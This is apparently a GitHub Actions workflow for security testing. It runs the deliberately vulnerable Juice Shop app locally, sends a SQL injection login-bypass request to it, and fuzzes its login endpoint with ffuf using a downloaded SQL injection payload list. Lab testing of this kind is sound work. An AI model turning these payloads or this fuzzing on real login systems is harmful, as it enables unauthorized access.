name: Fuzzing

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf:
    runs-on: ubuntu-latest
    services:
        juice:
          image: bkimminich/juice-shop
          ports:
            - 3000:3000
    steps:
      - name: Wait for service
        run: |
            sleep 10 
            curl --path-as-is -i -s -k -X $'POST' \
              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
              $'http://localhost:3000/rest/user/login'

      - name: Get payloads
        run: |
          wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
      
      - name: Install fuzzing
        run: |
          go install github.com/ffuf/ffuf/v2@latest

      - name: Run fuzzing
        run: |
          $HOME/go/bin/ffuf -w SQL-Injection:USER -w SQL-Injection:PASS -X POST -mode clusterbomb -H "Content-Type: application/json" \
          -d '{"email":"USER","password":"PASS"}' \
          -u "http://localhost:3000/rest/user/login" -mc 200 -o ffuf-report.csv -of csv

      - name: Get Logs from Service
        if: always()
        run: |
          docker logs $(docker ps -q) > juice-logs.log

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: security-reports-bundle
          path: |
            juice-logs.log
            ffuf-report.csv
